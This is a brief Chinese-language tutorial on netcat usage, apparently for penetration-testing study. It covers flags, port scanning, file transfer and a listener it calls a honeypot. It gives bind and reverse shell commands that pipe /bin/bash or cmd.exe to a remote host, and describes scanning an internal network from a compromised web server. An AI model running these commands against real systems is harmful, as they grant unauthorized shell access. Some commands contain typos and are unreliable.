# Netcat的使用

Netcat常称为nc，拥有“瑞士军刀”的美誉。它基于socket协议工作。它被设计成一个可靠的后端工具，可以读写TCP或UDP网络连接，能被其它的程序或脚本直接驱动。同时它又是一个功能丰富的网络调试和开发工具，因为它可建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，在渗透测试领域，我们通常利用它来反弹shell。

## 常用参数

```
-l：开启监听
-p：指定端口

-n：以数字形式表示ip
-w: 设置超时时间

-u：使用UDP协议传输
-t：以telnet形式应答
-e：程序重定向

-z: 不进行交互，直接显示结果
-v：显示执行命令过程
```

## 常见用法

### 端口扫描

如想单纯的端口扫描的话，利用其它工具(比如nmap)会更好。nc端口扫描最主要的用途是：当获得了一个网站的权限之后，想再渗透进该网站的内网进行渗透。nmap工具是不能扫描到内网的，这时可把nc上传到web服务器上，利用它来扫描内网主机。用法为`nc -z -v -n <ip>  <port>|<port range>`，如果探测到端口开放，就可以继续探测其banner信息，输入get即可。

### 信息传输

可以利用nc做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的C-S模型。

文字传输如下：

+ 服务端：`nc -lpv <port>`
+ 客户端：`nc -nv  <ip>  <port>`

文件传输如下：

+ 服务端：`nc -lpv <port> < <SendFile>`
+ 客户端：`nc -nv <ip> <port> > <SaveDir>`

### 反弹shell

#### 正向连接

正向连接Linux

+ 靶机：`nv -lpv <port> -t -e /bin/bash`
+ 主机：`nc -nvv <ip> <port>`

正向连接Windows

+ 靶机：`nc -lvv -p <port> -t -e cmd.exe`
+ 主机：`nc -nvv <ip> <port>`

#### 反向连接

反向连接Linux

+ 主机：`nc -lpv <port>`
+ 靶机：`nc <ip> <port> -t -e /bin/bash`

反向连接Windows

+ 主机：`nc -lpv <port>`
+ 靶机：`nc <ip> <port> -t -e cmd.exe `

### 蜜罐

作为蜜罐，一直监听8888端口，直到ctrl+c停止：

```bash
nc -L -p 8888 > log.txt # 监听8888端口，并且将日志信息写入log.txt中
```

